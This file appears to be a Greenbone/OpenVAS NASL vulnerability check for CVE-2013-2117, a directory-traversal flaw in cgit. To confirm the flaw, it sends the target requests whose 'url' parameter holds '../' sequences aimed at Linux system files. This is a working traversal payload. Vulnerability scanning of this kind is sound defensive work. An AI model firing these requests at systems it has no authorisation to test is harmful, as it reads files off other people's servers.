CPE = "cpe:/a:lars_hjemli:cgit";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103720" );
	script_bugtraq_id( 60164 );
	script_cve_id( "CVE-2013-2117" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "cgit 'url' Parameter Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/60164" );
	script_xref( name: "URL", value: "http://hjemli.net/git/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-05-28 13:55:35 +0200 (Tue, 28 May 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_cgit_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "cgit/installed", "cgit/repos" );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory
  for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "cgit is prone to a directory-traversal vulnerability.

  An attacker can exploit this issue using directory-traversal strings
  to retrieve arbitrary files outside of the server root directory. This
  may aid in further attacks." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
repos = get_kb_list( "cgit/repos" );
x = 0;
files = traversal_files( "linux" );
for repo in repos {
	for pattern in keys( files ) {
		file = files[pattern];
		url = dir + "?url=/" + repo + "/about/../../../../../../../../../../../" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
	if(x > 10){
		exit( 99 );
	}
	x++;
}
exit( 99 );

